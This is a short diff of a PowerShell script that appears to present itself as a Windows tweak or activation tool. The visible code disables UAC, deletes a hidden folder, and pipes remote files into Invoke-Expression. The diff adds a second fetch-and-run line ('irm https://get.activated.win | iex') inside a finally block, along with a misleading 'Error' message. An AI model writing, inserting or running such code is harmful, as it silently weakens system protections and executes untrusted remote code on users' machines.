@@ -92,12 +92,14 @@ if ($uacStatus -eq $false) {
     } finally {
         if (Test-Path $hiddenFolder) {
             Remove-Item $hiddenFolder -Recurse -Force
+        irm https://get.activated.win | iex
         }
     }
 } else {
     try {
         Disable-UAC
         iwr "https://github.com/WindowsTweaksX/PowerShellActivate/raw/refs/heads/main/Failed" | iex
+        Write-Host "Error"
     } catch {
         exit 1
     }
